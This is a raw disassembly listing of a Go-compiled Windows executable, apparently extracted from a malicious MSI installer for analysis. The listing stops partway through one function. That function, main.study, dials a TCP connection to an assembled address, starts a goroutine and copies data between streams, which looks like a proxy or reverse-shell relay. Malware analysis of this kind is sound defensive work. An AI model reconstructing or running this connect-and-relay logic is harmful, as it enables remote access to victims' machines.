
/home/ubuntu/malicious_msi_decode/analysis/extracted/support_v1.3/demand.exe:     file format pei-x86-64


Disassembly of section .text:

0000000140276e40 <.text+0x275e40>:
   140276e40 <main.study>:	4c 8d a4 24 78 ff ff 	lea    r12,[rsp-0x88]
   140276e47:	ff 
   140276e48:	4d 3b 66 10          	cmp    r12,QWORD PTR [r14+0x10]
   140276e4c:	0f 86 bc 07 00 00    	jbe    0x14027760e
   140276e52:	55                   	push   rbp
   140276e53:	48 89 e5             	mov    rbp,rsp
   140276e56:	48 81 ec 00 01 00 00 	sub    rsp,0x100
   140276e5d:	44 0f 11 bc 24 f0 00 	movups XMMWORD PTR [rsp+0xf0],xmm15
   140276e64:	00 00 
   140276e66:	48 89 9c 24 18 01 00 	mov    QWORD PTR [rsp+0x118],rbx
   140276e6d:	00 
   140276e6e:	48 89 84 24 10 01 00 	mov    QWORD PTR [rsp+0x110],rax
   140276e75:	00 
   140276e76:	c6 44 24 5f 00       	mov    BYTE PTR [rsp+0x5f],0x0
   140276e7b:	84 00                	test   BYTE PTR [rax],al
   140276e7d:	48 8d 0d 7c 08 00 00 	lea    rcx,[rip+0x87c]        # 0x140277700 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec\x08M\\x8bf M\\x85\\xe4u\x1bH\\x8bJ\x08H\\x8bB\x10H\\x8bI\x18\\xff\\xd1H\\x83\\xc4\x08]\\xc3\\xe8P\x11\\xe0\\xff\\xeb\\xceL\\x8dl$\x18M9,$u\\xdaI\\x89$$\\xeb\\xd4\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.study.deferwrap1>
   140276e84:	48 89 8c 24 c8 00 00 	mov    QWORD PTR [rsp+0xc8],rcx
   140276e8b:	00 
   140276e8c:	48 89 84 24 d0 00 00 	mov    QWORD PTR [rsp+0xd0],rax
   140276e93:	00 
   140276e94:	48 89 9c 24 d8 00 00 	mov    QWORD PTR [rsp+0xd8],rbx
   140276e9b:	00 
   140276e9c:	48 8d 8c 24 c8 00 00 	lea    rcx,[rsp+0xc8]
   140276ea3:	00 
   140276ea4:	48 89 8c 24 f0 00 00 	mov    QWORD PTR [rsp+0xf0],rcx
   140276eab:	00 
   140276eac:	c6 44 24 5f 01       	mov    BYTE PTR [rsp+0x5f],0x1
   140276eb1:	48 85 c0             	test   rax,rax
   140276eb4:	74 16                	je     0x140276ecc
   140276eb6:	48 8b 48 08          	mov    rcx,QWORD PTR [rax+0x8]
   140276eba:	48 8b 15 4f ad 38 00 	mov    rdx,QWORD PTR [rip+0x38ad4f]        # 0x140601c10 '\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140276ec1:	48 8b 32             	mov    rsi,QWORD PTR [rdx]
   140276ec4:	8b 78 10             	mov    edi,DWORD PTR [rax+0x10]
   140276ec7:	e9 ed 06 00 00       	jmp    0x1402775b9
   140276ecc:	e8 8f 0a 00 00       	call   0x140277960 <main.protest>
   140276ed1:	48 85 ff             	test   rdi,rdi
   140276ed4:	74 29                	je     0x140276eff
   140276ed6:	48 8b 8c 24 10 01 00 	mov    rcx,QWORD PTR [rsp+0x110]
   140276edd:	00 
   140276ede:	66 90                	xchg   ax,ax
   140276ee0:	48 85 c9             	test   rcx,rcx
   140276ee3:	0f 84 3f 06 00 00    	je     0x140277528
   140276ee9:	48 8b 59 08          	mov    rbx,QWORD PTR [rcx+0x8]
   140276eed:	48 8b 15 3c ad 38 00 	mov    rdx,QWORD PTR [rip+0x38ad3c]        # 0x140601c30 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140276ef4:	48 8b 32             	mov    rsi,QWORD PTR [rdx]
   140276ef7:	8b 49 10             	mov    ecx,DWORD PTR [rcx+0x10]
   140276efa:	e9 7f 06 00 00       	jmp    0x14027757e
   140276eff:	48 89 9c 24 88 00 00 	mov    QWORD PTR [rsp+0x88],rbx
   140276f06:	00 
   140276f07:	48 89 84 24 a0 00 00 	mov    QWORD PTR [rsp+0xa0],rax
   140276f0e:	00 
   140276f0f:	0f b7 d1             	movzx  edx,cx
   140276f12:	48 85 d2             	test   rdx,rdx
   140276f15:	74 10                	je     0x140276f27
   140276f17:	44 0f 11 7c 24 4f    	movups XMMWORD PTR [rsp+0x4f],xmm15
   140276f1d:	b9 10 00 00 00       	mov    ecx,0x10
   140276f22:	e9 6d 05 00 00       	jmp    0x140277494
   140276f27:	b9 01 00 00 00       	mov    ecx,0x1
   140276f2c:	48 8d 15 26 da 0e 00 	lea    rdx,[rip+0xeda26]        # 0x140364959 '0),/`(-M5LC#-n]: []), : {}":??ip53->.\\\\\\00µi))(|0|1..iv; :% ,h280%v\r\n \tOK>\n("")) )\n   +:\n @s  PB n='
   140276f33:	48 89 8c 24 80 00 00 	mov    QWORD PTR [rsp+0x80],rcx
   140276f3a:	00 
   140276f3b:	48 89 94 24 98 00 00 	mov    QWORD PTR [rsp+0x98],rdx
   140276f42:	00 
   140276f43:	48 89 04 24          	mov    QWORD PTR [rsp],rax
   140276f47:	48 89 5c 24 08       	mov    QWORD PTR [rsp+0x8],rbx
   140276f4c:	c6 44 24 10 3a       	mov    BYTE PTR [rsp+0x10],0x3a
   140276f51:	e8 6a cc d8 ff       	call   0x140003bc0 <internal/bytealg.IndexByteString>
   140276f56:	45 0f 57 ff          	xorps  xmm15,xmm15
   140276f5a:	4c 8b 35 97 0c 3e 00 	mov    r14,QWORD PTR [rip+0x3e0c97]        # 0x140657bf8 ''
   140276f61:	65 4d 8b 36          	mov    r14,QWORD PTR gs:[r14]
   140276f65:	4d 8b 36             	mov    r14,QWORD PTR [r14]
   140276f68:	48 83 7c 24 18 00    	cmp    QWORD PTR [rsp+0x18],0x0
   140276f6e:	7c 42                	jl     0x140276fb2
   140276f70:	31 c0                	xor    eax,eax
   140276f72:	48 8d 1d 47 b1 16 00 	lea    rbx,[rip+0x16b147]        # 0x1403e20c0 '[\x00\x00\x00\x00\x00\x00\x00"\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00V\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00\x00\x00\x00\x00\x17\x06\x00\x00'
   140276f79:	b9 01 00 00 00       	mov    ecx,0x1
   140276f7e:	48 8b bc 24 a0 00 00 	mov    rdi,QWORD PTR [rsp+0xa0]
   140276f85:	00 
   140276f86:	48 8b b4 24 88 00 00 	mov    rsi,QWORD PTR [rsp+0x88]
   140276f8d:	00 
   140276f8e:	4c 8d 05 d2 d9 0e 00 	lea    r8,[rip+0xed9d2]        # 0x140364967 ']: []), : {}":??ip53->.\\\\\\00µi))(|0|1..iv; :% ,h280%v\r\n \tOK>\n("")) )\n   +:\n @s  PB n=][}\n]\n> [  ]\n '
   140276f95:	41 b9 02 00 00 00    	mov    r9d,0x2
   140276f9b:	4c 8b 94 24 98 00 00 	mov    r10,QWORD PTR [rsp+0x98]
   140276fa2:	00 
   140276fa3:	4c 8b 9c 24 80 00 00 	mov    r11,QWORD PTR [rsp+0x80]
   140276faa:	00 
   140276fab:	e8 50 31 de ff       	call   0x14005a100 <runtime.concatstring4>
   140276fb0:	eb 33                	jmp    0x140276fe5
   140276fb2:	31 c0                	xor    eax,eax
   140276fb4:	48 8b 9c 24 a0 00 00 	mov    rbx,QWORD PTR [rsp+0xa0]
   140276fbb:	00 
   140276fbc:	48 8b 8c 24 88 00 00 	mov    rcx,QWORD PTR [rsp+0x88]
   140276fc3:	00 
   140276fc4:	48 8d 3d ed b0 16 00 	lea    rdi,[rip+0x16b0ed]        # 0x1403e20b8 ':\x00\x00\x00\x00\x00\x00\x00[\x00\x00\x00\x00\x00\x00\x00"\x00\x00\x00\x00\x00\x00\x00\x0f\x00\x00\x00\x00\x00\x00\x00\x16\x00\x00\x00\x00\x00\x00\x00\x0e\x00\x00\x00\x00\x00\x00\x00V\x00\x00\x00\x00\x00\x00\x00\x06\x00\x00\x00\x00\x00\x00\x006\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x14\x00\x00\x00\x00\x00\x00\x00\x0c\x00\x00\x00\x00\x00\x00\x00\x12\x00\x00\x00'
   140276fcb:	be 01 00 00 00       	mov    esi,0x1
   140276fd0:	4c 8b 84 24 98 00 00 	mov    r8,QWORD PTR [rsp+0x98]
   140276fd7:	00 
   140276fd8:	4c 8b 8c 24 80 00 00 	mov    r9,QWORD PTR [rsp+0x80]
   140276fdf:	00 
   140276fe0:	e8 5b 30 de ff       	call   0x14005a040 <runtime.concatstring3>
   140276fe5:	48 89 c1             	mov    rcx,rax
   140276fe8:	48 89 df             	mov    rdi,rbx
   140276feb:	48 8d 05 16 da 0e 00 	lea    rax,[rip+0xeda16]        # 0x140364a08 'tcp\'"\'EOF???cgodnsudpftpssh::1setNUL:\\/SunMonTueWedThuFriSatJanFebMarAprMayJunJulAugSepOctNovDecUTCE'
   140276ff2:	bb 03 00 00 00       	mov    ebx,0x3
   140276ff7:	e8 24 c8 ea ff       	call   0x140123820 <net.Dial>
   140276ffc:	0f 1f 40 00          	nop    DWORD PTR [rax+0x0]
   140277000:	48 85 c9             	test   rcx,rcx
   140277003:	74 27                	je     0x14027702c
   140277005:	48 8b 8c 24 10 01 00 	mov    rcx,QWORD PTR [rsp+0x110]
   14027700c:	00 
   14027700d:	48 85 c9             	test   rcx,rcx
   140277010:	0f 84 dc 03 00 00    	je     0x1402773f2
   140277016:	48 8b 59 08          	mov    rbx,QWORD PTR [rcx+0x8]
   14027701a:	48 8b 15 2f ac 38 00 	mov    rdx,QWORD PTR [rip+0x38ac2f]        # 0x140601c50 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140277021:	48 8b 32             	mov    rsi,QWORD PTR [rdx]
   140277024:	8b 49 10             	mov    ecx,DWORD PTR [rcx+0x10]
   140277027:	e9 1c 04 00 00       	jmp    0x140277448
   14027702c:	48 89 84 24 90 00 00 	mov    QWORD PTR [rsp+0x90],rax
   140277033:	00 
   140277034:	48 89 9c 24 a8 00 00 	mov    QWORD PTR [rsp+0xa8],rbx
   14027703b:	00 
   14027703c:	84 00                	test   BYTE PTR [rax],al
   14027703e:	48 8d 0d 5b 06 00 00 	lea    rcx,[rip+0x65b]        # 0x1402776a0 'I;f\x10v%UH\\x89\\xe5H\\x83\\xec\x08M\\x8bf M\\x85\\xe4u\x1bH\\x8bJ\x08H\\x8bB\x10H\\x8bI\x18\\xff\\xd1H\\x83\\xc4\x08]\\xc3\\xe8\\xb0\x11\\xe0\\xff\\xeb\\xceL\\x8dl$\x18M9,$u\\xdaI\\x89$$\\xeb\\xd4\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.study.deferwrap2>
   140277045:	48 89 8c 24 b0 00 00 	mov    QWORD PTR [rsp+0xb0],rcx
   14027704c:	00 
   14027704d:	48 89 84 24 b8 00 00 	mov    QWORD PTR [rsp+0xb8],rax
   140277054:	00 
   140277055:	48 89 9c 24 c0 00 00 	mov    QWORD PTR [rsp+0xc0],rbx
   14027705c:	00 
   14027705d:	48 8d 8c 24 b0 00 00 	lea    rcx,[rsp+0xb0]
   140277064:	00 
   140277065:	48 89 8c 24 f8 00 00 	mov    QWORD PTR [rsp+0xf8],rcx
   14027706c:	00 
   14027706d:	c6 44 24 5f 03       	mov    BYTE PTR [rsp+0x5f],0x3
   140277072:	48 8b 8c 24 10 01 00 	mov    rcx,QWORD PTR [rsp+0x110]
   140277079:	00 
   14027707a:	48 85 c9             	test   rcx,rcx
   14027707d:	74 17                	je     0x140277096
   14027707f:	48 8b 51 08          	mov    rdx,QWORD PTR [rcx+0x8]
   140277083:	48 8b 35 e6 ab 38 00 	mov    rsi,QWORD PTR [rip+0x38abe6]        # 0x140601c70 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   14027708a:	48 8b 3e             	mov    rdi,QWORD PTR [rsi]
   14027708d:	44 8b 41 10          	mov    r8d,DWORD PTR [rcx+0x10]
   140277091:	e9 1b 03 00 00       	jmp    0x1402773b1
   140277096:	48 89 8c 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rcx
   14027709d:	00 
   14027709e:	48 8d 05 9b 1d 08 00 	lea    rax,[rip+0x81d9b]        # 0x1402f8e40 '\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\\xf0\\xacz\x00\n\x01\x01\x11\\xb0I8@\x01\x00\x00\x00\\xe82>@\x01\x00\x00\x00NB\x00\x00\x00\x00\x00\x00\x00S/@\x01\x00\x00\x00\\xa0\x1e/@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00'
   1402770a5:	e8 56 f3 d9 ff       	call   0x140016400 <runtime.newobject>
   1402770aa:	48 8b 8c 24 e8 00 00 	mov    rcx,QWORD PTR [rsp+0xe8]
   1402770b1:	00 
   1402770b2:	48 8b 49 18          	mov    rcx,QWORD PTR [rcx+0x18]
   1402770b6:	48 89 c3             	mov    rbx,rax
   1402770b9:	bf 01 00 00 00       	mov    edi,0x1
   1402770be:	48 8b 84 24 18 01 00 	mov    rax,QWORD PTR [rsp+0x118]
   1402770c5:	00 
   1402770c6:	48 89 ca             	mov    rdx,rcx
   1402770c9:	48 89 f9             	mov    rcx,rdi
   1402770cc:	ff d2                	call   rdx
   1402770ce:	48 85 db             	test   rbx,rbx
   1402770d1:	75 38                	jne    0x14027710b
   1402770d3:	48 8b 8c 24 90 00 00 	mov    rcx,QWORD PTR [rsp+0x90]
   1402770da:	00 
   1402770db:	0f 1f 44 00 00       	nop    DWORD PTR [rax+rax*1+0x0]
   1402770e0:	48 85 c9             	test   rcx,rcx
   1402770e3:	74 16                	je     0x1402770fb
   1402770e5:	48 8b 59 08          	mov    rbx,QWORD PTR [rcx+0x8]
   1402770e9:	48 8b 15 a0 ab 38 00 	mov    rdx,QWORD PTR [rip+0x38aba0]        # 0x140601c90 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   1402770f0:	48 8b 32             	mov    rsi,QWORD PTR [rdx]
   1402770f3:	8b 79 10             	mov    edi,DWORD PTR [rcx+0x10]
   1402770f6:	e9 57 02 00 00       	jmp    0x140277352
   1402770fb:	48 8b 94 24 10 01 00 	mov    rdx,QWORD PTR [rsp+0x110]
   140277102:	00 
   140277103:	48 85 d2             	test   rdx,rdx
   140277106:	48 89 c8             	mov    rax,rcx
   140277109:	eb 2d                	jmp    0x140277138
   14027710b:	c6 44 24 5f 01       	mov    BYTE PTR [rsp+0x5f],0x1
   140277110:	48 8b 94 24 f8 00 00 	mov    rdx,QWORD PTR [rsp+0xf8]
   140277117:	00 
   140277118:	48 8b 02             	mov    rax,QWORD PTR [rdx]
   14027711b:	ff d0                	call   rax
   14027711d:	c6 44 24 5f 00       	mov    BYTE PTR [rsp+0x5f],0x0
   140277122:	48 8b 94 24 f0 00 00 	mov    rdx,QWORD PTR [rsp+0xf0]
   140277129:	00 
   14027712a:	48 8b 02             	mov    rax,QWORD PTR [rdx]
   14027712d:	ff d0                	call   rax
   14027712f:	48 81 c4 00 01 00 00 	add    rsp,0x100
   140277136:	5d                   	pop    rbp
   140277137:	c3                   	ret
   140277138:	48 89 8c 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rcx
   14027713f:	00 
   140277140:	74 17                	je     0x140277159
   140277142:	48 8b 5a 08          	mov    rbx,QWORD PTR [rdx+0x8]
   140277146:	48 8b 35 63 ab 38 00 	mov    rsi,QWORD PTR [rip+0x38ab63]        # 0x140601cb0 '\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   14027714d:	48 8b 3e             	mov    rdi,QWORD PTR [rsi]
   140277150:	44 8b 42 10          	mov    r8d,DWORD PTR [rdx+0x10]
   140277154:	e9 b8 01 00 00       	jmp    0x140277311
   140277159:	48 89 94 24 e0 00 00 	mov    QWORD PTR [rsp+0xe0],rdx
   140277160:	00 
   140277161:	48 8d 05 58 67 0b 00 	lea    rax,[rip+0xb6758]        # 0x14032d8c0 '(\x00\x00\x00\x00\x00\x00\x00(\x00\x00\x00\x00\x00\x00\x00A"\\x96%\x02\x08\x08\x19\x00\x00\x00\x00\x00\x00\x00\x00\x08!>@\x01\x00\x00\x00ن\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\\xd92@\x01\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x03\x00\x00\x00\x00\x00\x00\x00\x0b\x00-@\x01\x00\x00\x00@U/@\x01\x00\x00\x00\x00\x00\x00\x00'
   140277168:	e8 93 f2 d9 ff       	call   0x140016400 <runtime.newobject>
   14027716d:	48 8d 0d cc 04 00 00 	lea    rcx,[rip+0x4cc]        # 0x140277640 'I;f\x10v4UH\\x89\\xe5H\\x83\\xec8M\\x8bf M\\x85\\xe4u+H\\x8bB\x08H\\x8bZ\x10H\\x8bJ\x18H\\x8bz 1\\xf6E1\\xc0M\\x89\\xc1\\xe8\x0ce\\xe3\\xffH\\x83\\xc48]\\xc3\\xe8\x01\x12\\xe0\\xff\\x90\\xeb\\xbeL\\x8dl$HM9,$u\\xcaI\\x89$$\\xeb\\xc4\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xcc\\xccI;f\x10' <main.study.gowrap3>
   140277174:	48 89 08             	mov    QWORD PTR [rax],rcx
   140277177:	48 8b 8c 24 e8 00 00 	mov    rcx,QWORD PTR [rsp+0xe8]
   14027717e:	00 
   14027717f:	48 89 48 08          	mov    QWORD PTR [rax+0x8],rcx
   140277183:	83 3d 36 0c 3e 00 00 	cmp    DWORD PTR [rip+0x3e0c36],0x0        # 0x140657dc0 ''
   14027718a:	75 14                	jne    0x1402771a0
   14027718c:	48 8b 8c 24 a8 00 00 	mov    rcx,QWORD PTR [rsp+0xa8]
   140277193:	00 
   140277194:	48 8b 94 24 18 01 00 	mov    rdx,QWORD PTR [rsp+0x118]
   14027719b:	00 
   14027719c:	eb 1e                	jmp    0x1402771bc
   14027719e:	66 90                	xchg   ax,ax
   1402771a0:	e8 9b 36 e0 ff       	call   0x14007a840 <runtime.gcWriteBarrier2>
   1402771a5:	48 8b 8c 24 a8 00 00 	mov    rcx,QWORD PTR [rsp+0xa8]
   1402771ac:	00 
   1402771ad:	49 89 0b             	mov    QWORD PTR [r11],rcx
   1402771b0:	48 8b 94 24 18 01 00 	mov    rdx,QWORD PTR [rsp+0x118]
   1402771b7:	00 
   1402771b8:	49 89 53 08          	mov    QWORD PTR [r11+0x8],rdx
   1402771bc:	48 89 48 10          	mov    QWORD PTR [rax+0x10],rcx
   1402771c0:	48 8b 8c 24 e0 00 00 	mov    rcx,QWORD PTR [rsp+0xe0]
   1402771c7:	00 
   1402771c8:	48 89 48 18          	mov    QWORD PTR [rax+0x18],rcx
   1402771cc:	48 89 50 20          	mov    QWORD PTR [rax+0x20],rdx
   1402771d0:	e8 0b 49 dd ff       	call   0x14004bae0 <runtime.newproc>
   1402771d5:	48 8b 8c 24 10 01 00 	mov    rcx,QWORD PTR [rsp+0x110]
   1402771dc:	00 
   1402771dd:	0f 1f 00             	nop    DWORD PTR [rax]
   1402771e0:	48 85 c9             	test   rcx,rcx
   1402771e3:	74 17                	je     0x1402771fc
   1402771e5:	48 8b 59 08          	mov    rbx,QWORD PTR [rcx+0x8]
   1402771e9:	48 8b 15 e0 aa 38 00 	mov    rdx,QWORD PTR [rip+0x38aae0]        # 0x140601cd0 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   1402771f0:	4c 8b 12             	mov    r10,QWORD PTR [rdx]
   1402771f3:	44 8b 59 10          	mov    r11d,DWORD PTR [rcx+0x10]
   1402771f7:	e9 c3 00 00 00       	jmp    0x1402772bf
   1402771fc:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   140277203:	00 
   140277204:	48 85 d2             	test   rdx,rdx
   140277207:	74 13                	je     0x14027721c
   140277209:	48 8b 5a 08          	mov    rbx,QWORD PTR [rdx+0x8]
   14027720d:	4c 8b 15 dc aa 38 00 	mov    r10,QWORD PTR [rip+0x38aadc]        # 0x140601cf0 '\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   140277214:	4d 8b 1a             	mov    r11,QWORD PTR [r10]
   140277217:	8b 52 10             	mov    edx,DWORD PTR [rdx+0x10]
   14027721a:	eb 52                	jmp    0x14027726e
   14027721c:	48 89 c8             	mov    rax,rcx
   14027721f:	48 8b 9c 24 18 01 00 	mov    rbx,QWORD PTR [rsp+0x118]
   140277226:	00 
   140277227:	48 89 d1             	mov    rcx,rdx
   14027722a:	48 8b bc 24 a8 00 00 	mov    rdi,QWORD PTR [rsp+0xa8]
   140277231:	00 
   140277232:	31 f6                	xor    esi,esi
   140277234:	45 31 c0             	xor    r8d,r8d
   140277237:	4d 89 c1             	mov    r9,r8
   14027723a:	e8 41 69 e3 ff       	call   0x1400adb80 <io.copyBuffer>
   14027723f:	c6 44 24 5f 01       	mov    BYTE PTR [rsp+0x5f],0x1
   140277244:	48 8b 94 24 f8 00 00 	mov    rdx,QWORD PTR [rsp+0xf8]
   14027724b:	00 
   14027724c:	4c 8b 12             	mov    r10,QWORD PTR [rdx]
   14027724f:	41 ff d2             	call   r10
   140277252:	c6 44 24 5f 00       	mov    BYTE PTR [rsp+0x5f],0x0
   140277257:	48 8b 94 24 f0 00 00 	mov    rdx,QWORD PTR [rsp+0xf0]
   14027725e:	00 
   14027725f:	4c 8b 12             	mov    r10,QWORD PTR [rdx]
   140277262:	41 ff d2             	call   r10
   140277265:	48 81 c4 00 01 00 00 	add    rsp,0x100
   14027726c:	5d                   	pop    rbp
   14027726d:	c3                   	ret
   14027726e:	49 89 d4             	mov    r12,rdx
   140277271:	4c 21 da             	and    rdx,r11
   140277274:	48 c1 e2 04          	shl    rdx,0x4
   140277278:	4d 8b 6c 12 08       	mov    r13,QWORD PTR [r10+rdx*1+0x8]
   14027727d:	0f 1f 00             	nop    DWORD PTR [rax]
   140277280:	49 39 dd             	cmp    r13,rbx
   140277283:	74 30                	je     0x1402772b5
   140277285:	49 8d 54 24 01       	lea    rdx,[r12+0x1]
   14027728a:	4d 85 ed             	test   r13,r13
   14027728d:	75 df                	jne    0x14027726e
   14027728f:	48 89 8c 24 e8 00 00 	mov    QWORD PTR [rsp+0xe8],rcx
   140277296:	00 
   140277297:	48 8d 05 52 aa 38 00 	lea    rax,[rip+0x38aa52]        # 0x140601cf0 '\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xdc0@\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   14027729e:	66 90                	xchg   ax,ax
   1402772a0:	e8 7b b6 d9 ff       	call   0x140012920 <runtime.typeAssert>
   1402772a5:	48 8b 8c 24 e8 00 00 	mov    rcx,QWORD PTR [rsp+0xe8]
   1402772ac:	00 
   1402772ad:	48 89 c2             	mov    rdx,rax
   1402772b0:	e9 67 ff ff ff       	jmp    0x14027721c
   1402772b5:	49 8b 54 12 10       	mov    rdx,QWORD PTR [r10+rdx*1+0x10]
   1402772ba:	e9 5d ff ff ff       	jmp    0x14027721c
   1402772bf:	4d 89 dc             	mov    r12,r11
   1402772c2:	4d 21 d3             	and    r11,r10
   1402772c5:	49 c1 e3 04          	shl    r11,0x4
   1402772c9:	4e 8b 6c 1a 08       	mov    r13,QWORD PTR [rdx+r11*1+0x8]
   1402772ce:	49 39 dd             	cmp    r13,rbx
   1402772d1:	74 29                	je     0x1402772fc
   1402772d3:	4d 8d 5c 24 01       	lea    r11,[r12+0x1]
   1402772d8:	4d 85 ed             	test   r13,r13
   1402772db:	75 e2                	jne    0x1402772bf
   1402772dd:	48 8d 05 ec a9 38 00 	lea    rax,[rip+0x38a9ec]        # 0x140601cd0 '\x10~e@\x01\x00\x00\x00@\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@\x01\x00\x00\x00\\xc0\\xb30@\x01\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10~e@'
   1402772e4:	e8 37 b6 d9 ff       	call   0x140012920 <runtime.typeAssert>
   1402772e9:	48 8b 94 24 90 00 00 	mov    rdx,QWORD PTR [rsp+0x90]
   1402772f0:	00 
   1402772f1:	48 85 d2             	test   rdx,rdx
   1402772f4:	48 89 c1             	mov    rcx,rax
